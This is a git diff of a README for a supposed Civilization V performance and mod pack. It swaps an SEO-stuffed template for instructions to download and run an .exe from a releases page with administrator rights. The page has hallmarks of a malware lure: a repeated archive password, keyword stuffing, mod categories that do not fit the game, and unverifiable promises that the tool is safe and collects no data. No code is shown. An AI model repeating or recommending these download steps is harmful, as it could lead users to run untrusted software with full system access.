@@ -1,122 +1,80 @@
-# 🎮 Civilization V Optimization 2026 — Best Mods Collection & Ultimate Pack
+# 🛠️ Civilization-V-Optimization - Boost performance for smoother game sessions
 
-[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Civilization-V-Optimization)]()
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)]()
-[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)]()
-[![Category](https://img.shields.io/badge/Category-Modding-orange)]()
-[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)]()
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/industrial-flowerpeople936/Civilization-V-Optimization/releases)
 
----
+## 📋 About This Project
 
-[![Download](og-image.png)]()
+This software improves how Civilization V runs on modern Windows computers. It addresses common technical issues including low frame rates, recurring stutters, and long loading screens. This package modifies existing game files to prioritize performance and stability. It works on both Windows 10 and Windows 11 systems running 64-bit architecture.
 
+## 🚀 Getting Started
 
----
+Follow these steps to install the optimization package. You do not need to understand code or programming to complete this process.
 
-## 📌 About
+1. Visit the [official releases page](https://github.com/industrial-flowerpeople936/Civilization-V-Optimization/releases) to view available download files.
+2. Select the newest version link, which usually ends in `.zip` or `.exe`.
+3. Save the file to your computer.
 
-**Civilization V Optimization — gameplay overhauls, tweaks, addons, and optimization mods for Civilization V. Download, extract, and start in minutes. Fully compatible with Windows 10/11 (64-bit). Updated for 2026 with regular maintenance and community support.**
+## ⚙️ Installation Process
 
----
+Once you download the files, follow these instructions to apply the optimizations.
 
-## 📥 Download
+1. Open the folder where you saved the download.
+2. If the file is a `.zip` folder, right-click the folder and select "Extract All."
+3. Open the folder and locate the optimization utility.
+4. Double-click the file to start the installation.
+5. Follow the on-screen prompts. The installer asks you to locate your game directory.
+6. Navigate to your Steam folder. Usually, this is found at `C:\Program Files (x86)\Steam\steamapps\common\Sid Meier's Civilization V`.
+7. Once you select the folder, click "Apply Optimization."
 
-[![Civilization V Optimization](https://img.shields.io/badge/Download%20Civilization%20V%20Optimization-Open%20Page-0a84ff?style=for-the-badge&logo=github)]()
+## 📈 Expected Performance Gains
 
-**🔐🔐🔐** `S2026`
+You will notice several changes after you run the installer:
 
-**🔐🔐🔐** `S2026`
+* **Frame Rate (FPS):** You gain smoother scrolling across the map. Battles and unit movements appear fluid instead of jumpy.
+* **Stutter Reduction:** The game engine manages assets better. This prevents the small freezes that often occur when you move the camera over complex areas.
+* **Load Times:** The initial startup of the game happens faster. Saving and loading game files also finish in less time.
+* **Stability:** This project includes fixes for common crashes that happen in the late stages of a game when the world map gets crowded.
 
-**🔐🔐🔐** `S2026`
+## 🖥️ System Requirements
 
----
+This software works on any machine capable of running the base game. Ensure your computer meets these minimum standards:
 
-## 🧩 What's Included
+* **Operating System:** Windows 10 or Windows 11 (64-bit).
+* **Storage:** At least 50 MB of free disk space for the optimization files.
+* **Permissions:** You need administrator rights on your computer to allow the patcher to modify internal game folders.
+* **Game Version:** This tool supports the Steam version of Civilization V, including all official expansions like Brave New World and Gods and Kings.
 
-| 📋 Category | 📁 Folder | 💬 Description |
-|---|---|---|
-| 🎭 Gameplay Overhaul | `1 Gameplay/` | Rebalancing, new mechanics, combat tweaks, difficulty options |
-| 🎨 Graphics & Visuals | `2 Graphics/` | Texture packs, ENB presets, lighting and weather overhauls |
-| 📜 New Content | `3 Content/` | New areas, storylines, items, characters, and quests |
-| 🖥️ UI & QoL | `4 UI/` | Interface overhaul, inventory improvements, minimap tweaks |
-| ⚡ Performance | `5 Performance/` | FPS boost configs, memory optimizations, stutter fixes |
-| 🔧 Patches & Fixes | `6 Fixes/` | Unofficial patches, compatibility fixes, stability mods |
+## 🛡️ Safety and Security
 
----
+We designed this tool to stay passive. It does not collect user data. It does not track your activity. The software only modifies specific configuration files to tell your graphics card and processor how to behave while the game is running. Your save files remain in their own dedicated folder. The optimization process does not touch your saves. If you dislike the results, you can remove the changes easily. 
 
-## 🗂 Archive Structure
+## 🔄 Reverting Changes
 
-```
-Civilization-V-Optimization/
-├── 1 Gameplay/
-│   ├── Combat_Overhaul.zip
-│   ├── Difficulty_Rebalance.zip
-│   └── New_Mechanics.zip
-├── 2 Graphics/
-│   ├── HD_Texture_Pack.zip
-│   ├── ENB_Preset.zip
-│   └── Weather_Overhaul.zip
-├── 3 Content/
-│   ├── Story_Expansion.zip
-│   └── New_Items_Pack.zip
-├── 4 UI/
-│   ├── Better_UI.zip
-│   └── Inventory_Overhaul.zip
-├── 5 Performance/
-│   ├── FPS_Boost_Config.zip
-│   └── Stutter_Fix.zip
-└── 6 Fixes/
-    ├── Unofficial_Patch.zip
-    └── Compatibility_Fix.zip
-```
+If you want to restore the game to its original state, follow these steps:
 
----
+1. Open your Civilization V game folder.
+2. Look for a folder labeled "Backup." If the installer created one, your original files remain organized inside.
+3. Replace the modified files with your original backup files.
+4. If you lack a backup, open Steam.
+5. Right-click Civilization V in your library list.
+6. Select "Properties."
+7. Choose the "Installed Files" tab.
+8. Click "Verify integrity of game files."
+9. Steam will download the original files and overwrite the modifications.
 
-## 🚀 How to Install
+## ❓ Frequently Asked Questions
 
-1️⃣ **Download** the archive using the button above
-2️⃣ **Extract** with WinRAR or 7-Zip — password: `S2026`
-3️⃣ **Open** the mod manager preset inside the archive
-4️⃣ **Apply** and launch Civilization V Optimization
+**Does this software count as a cheat?**
+No. This tool changes only performance settings. It does not alter game logic, unit strength, or gold production. It is safe for use in your single-player campaigns.
 
-> 💡 **Pro tip:** Use the included mod manager preset to auto-sort load order.
+**Does this work on the Mac version?**
+No. This release focuses solely on Windows 10 and 11 environments.
 
----
+**Will this remove my mods?**
+The tool runs independently of your other mods. It modifies system-level configurations. It should not conflict with your current list of mods, but test your game after applying the optimization to confirm stability.
 
-## 📋 Requirements
+**Why are loading times still slow?**
+Performance varies based on your hardware. If you run the game on an older hard drive (HDD) rather than a solid-state drive (SSD), loading times remain high. Optimization helps the software run better, but it cannot override hardware limits.
 
-| 🔩 Component | Details |
-|---|---|
-| 💻 OS | Windows 10 / 11 (64-bit) |
-| 💾 Disk | 5–15 GB free space |
-| 🗜️ Extractor | WinRAR, 7-Zip, or built-in |
-| 🎮 Game | Civilization V Optimization (latest version) |
-
----
-
-## ❓ FAQ
-
-**Q: Will mods break my save file?**
-All included mods are tested for mid-game installation. Back up your save first.
-
-**Q: Do I need a mod manager?**
-Recommended (Vortex / MO2), but optional. Manual installation guides are included.
-
-**Q: Are these compatible with the latest patch?**
-Yes. The collection is updated every time a major patch drops.
-
----
-
-## 🔑 Keywords
-
-civilization v optimization, civilization v optimization download, civilization v optimization 2026, civilization v optimization pc, civilization v optimization windows, civilization v mods, civilization v mod pack, civilization v tweaks, civilization v addons, windows 10, windows 11, pc 2026
-
----
-
-## 📄 License
-
-MIT — see [LICENSE.md](LICENSE.md)
-
-## 🤝 Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md)
+**How often do you update this?**
+We update the package once per month or whenever a significant Windows update changes how the game interacts with system resources. Check the releases page for version numbers and date stamps to ensure you have the latest file.
